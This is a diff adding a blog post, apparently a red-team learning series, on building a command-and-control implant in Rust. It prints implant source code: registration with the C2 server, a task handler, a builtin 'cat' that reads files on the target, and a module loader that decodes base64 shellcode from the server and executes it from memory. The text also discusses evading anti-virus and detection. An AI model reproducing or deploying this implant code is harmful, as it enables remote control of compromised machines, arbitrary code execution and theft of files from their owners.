@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2022-07-25 Mon 19:29 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>C2 your own adventure part 1</title>
+<meta name="author" content="Main user for my machines" />
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="static/style.css" />
+<script>
+// @license magnet:?xt=urn:btih:1f739d935676111cfff4b4693e3816e664797050&amp;dn=gpl-3.0.txt GPL-v3-or-Later
+     function CodeHighlightOn(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.add("code-highlighted");
+         target.classList.add("code-highlighted");
+       }
+     }
+     function CodeHighlightOff(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.remove("code-highlighted");
+         target.classList.remove("code-highlighted");
+       }
+     }
+// @license-end
+</script>
+</head>
+<body>
+<div id="preamble" class="status">
+<div class="header">
+    <a href="index.html">Home</a>
+    <a href="https://github.com/c3lphie">Github</a>
+</div>
+</div>
+<div id="content" class="content">
+<header>
+<h1 class="title">C2 your own adventure part 1</h1>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgd94545b">1. Introduction</a></li>
+<li><a href="#org1d8b72c">2. What is C2?</a></li>
+<li><a href="#orga6ac28a">3. Communication flow</a></li>
+<li><a href="#org636c52f">4. The Agent</a>
+<ul>
+<li><a href="#orgd0fae37">4.1. Components</a>
+<ul>
+<li><a href="#org3350651">4.1.1. Communication</a></li>
+<li><a href="#org040f76a">4.1.2. Task handling</a>
+<ul>
+<li><a href="#org71d86dc">4.1.2.1. Builtins</a></li>
+<li><a href="#org9af2019">4.1.2.2. Modular</a></li>
+<li><a href="#orgd69e317">4.1.2.3. Future task types</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#org445b8f4">5. Conclusion</a></li>
+</ul>
+</div>
+</nav>
+
+<div id="outline-container-orgd94545b" class="outline-2">
+<h2 id="orgd94545b"><span class="section-number-2">1.</span> Introduction</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+So I recently got the idea that I wanted to create my own Command and Control framework.<br>
+Now why would I ever go down that rabbit hole, when there are multiple different available solutions out there?<br>
+I learn best by doing it myself, also <i>if</i> you want to go undetected on real assessments it's best to use your own tools.<br>
+This is due to frameworks like Metasploit and Cobalt strike being so well known, that everyone uses them.<br>
+Even the bad guys as it is easier, faster, and so feature rich that creating your own is seemingly a huge task, atleast if you want all the same bells and whistles that they offer.<br>
+</p>
+
+<p>
+But that being said if you want to examine other C2 frameworks, I can highly recommend <a href="https://www.thec2matrix.com/">The C2 Matrix</a>.<br>
+It has information on many different C2 frameworks, and I have/will be using it liberally for inspiration.<br>
+</p>
+
+<p>
+This series will be split into 3 parts, this one focusing on the agent running on the system and the communication flows.<br>
+Part 2 will focus on the server and how it will function, with multiple agents talking back to it.<br>
+</p>
+
+<p>
+And part 3&#x2026; Well I'll keep that a secret until then ;),<br>
+</p>
+
+<p>
+&#x2026;and yes the title is a corny joke on the "choose your own adventure" game genre<br>
+</p>
+</div>
+</div>
+<div id="outline-container-org1d8b72c" class="outline-2">
+<h2 id="org1d8b72c"><span class="section-number-2">2.</span> What is C2?</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+C2 is an abbreviation of Command and Control, it is a centralised way of controlling a lot of units of some kind.<br>
+From my research, mostly skimming the Wikipedia article, there are today two industries where this is seen<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>:<br>
+</p>
+<ol class="org-ol">
+<li>Military<br></li>
+<li>Cybersecurity<br></li>
+</ol>
+
+<p>
+As I'm not a soldier or high ranking military official, I'm going to focus on the cybersecurity aspect.<br>
+</p>
+
+<p>
+In this world C2 often refers to the server or other infrastructure put in place to control malware like RATs, backdoors, or zombies connected to a botnet.<br>
+</p>
+
+<p>
+There are many things that could be included into a C2 infrastructure such as proxies between the agent and the server, or rapidly changing domainnames to evade blacklisting.<br>
+Many of these extra features are implemented to make it harder for blueteams to figure what has happened.<br>
+</p>
+
+<p>
+However as this my first dive into creating this, I'll be taking a rather simple aproach and just have a simple server.<br>
+</p>
+</div>
+</div>
+
+<div id="outline-container-orga6ac28a" class="outline-2">
+<h2 id="orga6ac28a"><span class="section-number-2">3.</span> Communication flow</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+Alright so now that we got the basics down, let's have a look at how the communication flows between the C2 server and the Agent.<br>
+</p>
+
+<p>
+I have broken the communication down in the following sequence diagram:<br>
+</p>
+<p width="50">
+<img src="assets/2022-06-26_16-06-42_screenshot.png" alt="2022-06-26_16-06-42_screenshot.png" width="50"><br>
+A you can see the agent registers it self to the server, so that the system knows which Agents are alive.<br>
+Each of the agents will register with a unique id so that it is possible to track the tasks and match the incoming results.<br>
+This is incase of having multiple agents reporting back to the same C2 server.<br>
+</p>
+
+<p>
+After having registered the agent, the agent will begin to ask the server for tasks to complete.<br>
+These tasks can be a multitude of things, or it could be nothing.<br>
+But whatever it is, the agent <b>must</b> be able to handle it, and then send the results back to the C2 server.<br>
+</p>
+
+<p>
+It's not a complicated communication flow, and there is no reason it should be.<br>
+</p>
+</div>
+</div>
+
+<div id="outline-container-org636c52f" class="outline-2">
+<h2 id="org636c52f"><span class="section-number-2">4.</span> The Agent</h2>
+<div class="outline-text-2" id="text-4">
+<p>
+As I said in the beginning, I'll be focusing on the agent in this post.<br>
+There are a couple of choices that needs to be made with regards to the Agent.<br>
+</p>
+
+<ol class="org-ol">
+<li>How will it communicate with the server?<br></li>
+<li>Static functions vs modular functions<br></li>
+<li>What platforms should it support?<br></li>
+</ol>
+
+<p>
+Regarding the first question it of-course depends on what firewall rules are implemented on the target network.<br>
+But protocols like HTTP or HTTPS will probably work in most cases, as it is so widely used on the internet.<br>
+This is also quite easy regarding implementation as there are plenty libraries in multiple languages that can do some heavy lifting while implementing more interesting features of the agent.<br>
+So I will be using HTTP as an initial protocol for communication.<br>
+</p>
+
+<p>
+What I mean by "Static functions vs dynamic functions" is how much functionality is hardcoded into the agent.<br>
+This impacts the size of the agent, because as the amount of builtin functionality of the agent increases so does the agents size.<br>
+Where if the functionality can be modular, meaning it can be downloaded and executed during runtime of the agent, the size can be very limited.<br>
+</p>
+
+<p>
+A great example of this is the Meterpreter shell in the metasploit framework.<br>
+It is <i>very</i> modular, as it can load a multitude of post modules on the target machine.<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup><br>
+</p>
+
+<p>
+For the agent I'm creating I want a bit of both worlds. I like the idea of meterpreters modularity, but there is more learning programming wise when doing static functionality.<br>
+Therefore I'll make some basic shellcommands available such as: <code>ls</code>, <code>cd</code> and <code>cat</code>.<br>
+But also make it possible to create some loade modules of some kind.<br>
+</p>
+
+<p>
+In todays age of multiple different OS' and CPU architectures, it would be kind of a shame to be limited to only one OS and/or architecture.<br>
+The agent will therefore be written in Rust, as it is fast, cross-compileable and I want to learn it.<br>
+</p>
+</div>
+
+<div id="outline-container-orgd0fae37" class="outline-3">
+<h3 id="orgd0fae37"><span class="section-number-3">4.1.</span> Components</h3>
+<div class="outline-text-3" id="text-4-1">
+<p>
+In order to handle the above design decisions I have come up with the following 4 components to the Agent:<br>
+</p>
+
+<ol class="org-ol">
+<li>Communication<br></li>
+<li>Task handler<br>
+<ol class="org-ol">
+<li>Builtin tasks<br></li>
+<li>Modular task loader<br></li>
+</ol></li>
+</ol>
+
+<p>
+I won't go into detail about all implementation details, as they are language specific.<br>
+And if you decide to create your own for the sake of learning, I think there is more value in understanding the underlying concepts than just copying the code.<br>
+That being said <i>if</i> you want to copy my code, I'll publish the source code once I'm done with this small three part series so stay tuned ;)<br>
+</p>
+</div>
+
+<div id="outline-container-org3350651" class="outline-4">
+<h4 id="org3350651"><span class="section-number-4">4.1.1.</span> Communication</h4>
+<div class="outline-text-4" id="text-4-1-1">
+<p>
+To get development started quickly I went with the rust crate <a href="https://hyper.rs/"><code>hyper</code></a> for handling the web requests to the C2 server. As of writing this post, the traffic between the Server and Agent is not encrypted, but will down the line setup encryption using HTTPS.<br>
+</p>
+
+<p>
+The code written for this component is fairly simple, and is based on the examples provided by <code>hyper</code>.<br>
+</p>
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Source code for the <code>register</code> function</label><pre class="src src-rust">async fn register(imp_inf: &amp;ImplantInfo) -&gt; Result&lt;(), ImplantError&gt; {
+    let client = Client::new();
+
+    let uri = build_c2uri("/reg");
+
+    let req = Request::builder()
+	.method(Method::POST)
+	.uri(uri)
+	.header("Content-Type", "application/x-www-form-urlencoded")
+	.body(Body::from(format!(
+	    "id={}&amp;os={}&amp;arch={}",
+	    imp_inf.id, imp_inf.host_inf.os, imp_inf.host_inf.arch
+	)))
+	.expect("request builder");
+
+    let resp = client.request(req).await;
+
+    match resp {
+	Err(_e) =&gt; return Err(ImplantError::ServerUnreachable),
+	Ok(_) =&gt; Ok(()),
+    }
+}
+</pre>
+</div>
+<p>
+Now nothing wild and crazy is happening here, I build the request using the builder pattern.<br>
+And then I send it to the server using the client, and then await the response.<br>
+I would like to point out that I use a <code>POST</code> request, to send the initial data in the request body as this makes it easier to encrypt using HTTPS later.<br>
+If I want to go the HTTPS route, I would make a client outside of the scope of the function and then borrow it.<br>
+</p>
+
+<p>
+Beside registering the agent, there are also functions for fetching tasks and returning the results.<br>
+But they function more or less the same as the above example.<br>
+</p>
+</div>
+</div>
+
+<div id="outline-container-org040f76a" class="outline-4">
+<h4 id="org040f76a"><span class="section-number-4">4.1.2.</span> Task handling</h4>
+<div class="outline-text-4" id="text-4-1-2">
+<p>
+Right now there are only two types of tasks, those being the <code>builtin</code> and the <code>module</code> types.<br>
+To be able to handle those in an elegant way, and be able easily expand it later I created an enum with the possible types.<br>
+This enum is the used with the pattern matching functionality in rust to execute<br>
+</p>
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 2: </span>Task handler function</label><pre class="src src-rust">enum ImplantTaskType {
+    Builtin,
+    Module,
+    None,
+}
+
+[...]
+
+fn handle_task(
+    imp_inf: &amp;ImplantInfo,
+    task: &amp;mut ImplatTask,
+) -&gt; Result&lt;ImplantTaskResult, ImplantError&gt; {
+    match task.task_type {
+	ImplantTaskType::Builtin =&gt; builtin_tasks(task),
+	ImplantTaskType::Module =&gt; module_task(task),
+	ImplantTaskType::None =&gt; Err(ImplantError::TaskError),
+    }
+}
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org71d86dc" class="outline-5">
+<h5 id="org71d86dc"><span class="section-number-5">4.1.2.1.</span> Builtins</h5>
+<div class="outline-text-5" id="text-4-1-2-1">
+<p>
+I created five simple versions of the shell commands:<br>
+</p>
+<ul class="org-ul">
+<li>ls<br></li>
+<li>cd<br></li>
+<li>cat<br></li>
+<li>pwd<br></li>
+<li>whoami<br></li>
+</ul>
+
+<p>
+These implmentations are really simple, but a good introduction to interacting with files and directories in rust.<br>
+So let's take a closer look at the implementation of <code>cat</code><br>
+</p>
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 3: </span>builtin task function snippet</label><pre class="src src-rust">fn builtin_tasks(
+    task: &amp;mut ImplantTask,
+) -&gt; Result&lt;ImplantTaskResult, ImplantError&gt; {
+    let mut result = ImplantTaskResult::new();
+    match task.name.as_str() {
+	"ls" =&gt; {...}
+	"cd" =&gt; {...}
+	"cat" =&gt; {
+	    for arg in &amp;task.args {
+		let path = Path::new(arg);
+		result.push_str(
+		    format!("TARGET: {}:\n", path.display()).as_str(),
+		);
+		if !path.exists() {
+		    result.push_str("File does not exist\n");
+		} else if path.is_dir() {
+		    result.push_str("Can't read dir\n");
+		} else if path.is_file() {
+		    let mut file = File::open(path).unwrap();
+		    file.read_to_string(&amp;mut result);
+		}
+		result.push_str("======================\n")
+	    }
+	}
+	"pwd" =&gt; {...}
+	"whoami" =&gt; {...}
+	_ =&gt; {return Err(ImplantError::TaskError)}
+    }
+    task.run = true;
+    Ok(result)
+}
+</pre>
+</div>
+<p>
+I have redacted the source from the other builtin tasks in the above snippet.<br>
+The first thing that happens is that we match the name of the task to one of the implemented names.<br>
+If the matches <code>cat</code>, then we loop over each of the supplied arguments.<br>
+Each of the arguments are used to create a <code>Path</code> struct, which I do some test on to determine what exactly we're looking at.<br>
+If the <code>path.is_file()</code> call returns true, I then open the file and reads the content into the <code>result</code> string.<br>
+</p>
+
+<p>
+Again the implementation details aren't the is not the focus, so this is just to emphasize that the builtin tasks, as the name suggests, are built into the agent.<br>
+</p>
+</div>
+</div>
+
+<div id="outline-container-org9af2019" class="outline-5">
+<h5 id="org9af2019"><span class="section-number-5">4.1.2.2.</span> Modular</h5>
+<div class="outline-text-5" id="text-4-1-2-2">
+<p>
+The modular tasks are a tiny bit more complicated, as I need the agent to be able to load and execute arbitrary code.<br>
+This would be <i>really</i> easy in a language like C, where there are no memory restrictions.<br>
+But rust being the language it is, there are one or two hoops we need to jump through.<br>
+My result is based on an article from kerkour, which you can read here: <a href="https://kerkour.com/rust-execute-from-memory">How to execute shellcodes from memory in rust</a><br>
+</p>
+
+<p>
+I have outlined the steps needed to be done in the figure below:<br>
+</p>
+
+<figure id="org6ef5a1c">
+<img src="assets/2022-07-09_18-16-42_screenshot.png" alt="2022-07-09_18-16-42_screenshot.png"><br>
+
+<figcaption><span class="figure-number">Figure 1: </span>Modular task flow</figcaption>
+</figure>
+
+<p>
+I plan on sending the shellcode from the server base64 encoded, so that needs to be decoded before we load and execute it.<br>
+</p>
+
+<p>
+In the implementation of the modular tasks, I first decode the bytes containing the shellcode.<br>
+Then load it into memory by memorymapping it and then setting it as executable.<br>
+In the unsafe block, the bytes are copied into the executable memory before the transmute function is called, resulting in a function containing the shellcode.<br>
+</p>
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 4: </span>Modular task handling</label><pre class="src src-rust">fn module_task(
+    task: &amp;mut ImplantTask,
+) -&gt; Result&lt;ImplantTaskResult, ImplantError&gt; {
+    let result: String;
+    if task.args.len() == 1 {
+	let bytes = base64::decode(task.args[0].as_str()).unwrap();
+	let map = MemoryMap::new(
+	    bytes.len(),
+	    &amp;[MapExecutable, MapReadable, MapWritable],
+	).unwrap();
+	unsafe{
+	    std::ptr::copy(bytes.as_ptr(), map.data(), bytes.len());
+	    let exec_shellcode: extern "C" fn() -&gt; &amp;str = mem::transmute(map.data());
+	    let res = exec_shellcode();
+	    result = String::from(res);
+	}
+    }
+    Ok(result)
+}
+</pre>
+</div>
+
+<p>
+And that's it, atleast for executing it. Next problem&#x2026; how do we make these shellcodes?<br>
+Here I want to redirect to another article from kerkour called <a href="https://kerkour.com/shellcode-in-rust">How to write and compile shellcode in rust</a>, as an introduction to this.<br>
+You can of course write it manually in assembly, but writing in a higher language such as rust may be favorable for you.<br>
+</p>
+
+<p>
+I have started on a side project in tandem with this one that will make it a bit easier to create shellcode. But that is not in the scope of this post ;)<br>
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgd69e317" class="outline-5">
+<h5 id="orgd69e317"><span class="section-number-5">4.1.2.3.</span> Future task types</h5>
+<div class="outline-text-5" id="text-4-1-2-3">
+<p>
+Shellcode is quite modular because it can do whatever it is told, but there is a lot of premade tools that would be nice to be able to be able to run.<br>
+</p>
+
+<p>
+There are different ways to do this, it could download the executable to the harddisk and then just run it.<br>
+This might give problems with anti-virus, but if it's run from memory kinda like the shellcode it shouldn't ring that many alarms.<br>
+It could also execute directly from memory, which would also reduce cleanup after.<br>
+</p>
+
+<p>
+Another type of tasks could be shellscripts such as powershell or bash depending on the target system.<br>
+</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org445b8f4" class="outline-2">
+<h2 id="org445b8f4"><span class="section-number-2">5.</span> Conclusion</h2>
+<div class="outline-text-2" id="text-5">
+<p>
+If you have read this far I really hope enjoyed and learned a little about what goes into creating a agent.<br>
+</p>
+
+<p>
+Most of the focus has been on the design, because the implementation will always differ between languages.<br>
+As this was the first agent I have created, there is still a bunch of features that I want, that I don't feel like describing in detail.<br>
+A lot of this has to do with doing things covert, as the callbacks are quite noisy at the moment.<br>
+What I got right now isn't meant to be stealthy, it just meant to work.<br>
+Also persistense isn't a thing yet<br>
+</p>
+
+<p>
+Next post will focus on the server that the agent will make callbacks to.<br>
+</p>
+</div>
+</div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+<a href="https://en.wikipedia.org/wiki/Command_and_control">https://en.wikipedia.org/wiki/Command_and_control</a> <br>
+</p></div></div>
+
+<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+<a href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/">https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/</a> <br>
+</p></div></div>
+
+
+</div>
+</div></div>
+<div id="postamble" class="status">
+<div class="footer">
+    <div id="copyright">
+        <small>&copy; Copyright 2022, C3lphie</small>
+    </div>
+</div>
+</div>
+</body>
+</html>
